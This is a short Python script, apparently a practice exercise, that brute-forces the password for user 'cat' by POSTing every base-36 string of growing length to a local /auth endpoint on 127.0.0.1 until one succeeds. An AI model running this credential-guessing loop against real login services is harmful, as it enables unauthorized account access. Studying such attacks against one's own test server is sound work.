import requests

alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
base = len(alphabet)

i = 0
length = 0

while True:

    result = ''
    temp = i
    while temp > 0:
        rest = temp % base  # остаток от деления
        result = alphabet[rest] + result
        temp = temp // base  # целочисленное деление

    while len(result) < length:
        result = '0' + result

    data = {'login': 'cat', 'password': result}
    response = requests.post('http://127.0.0.1:5000/auth', json=data)
    if response.status_code == 200:
        print('SUCCESS!', result)
        break

    if result == 'z' * length:
        length += 1
        i = 0
    else:
        i += 1
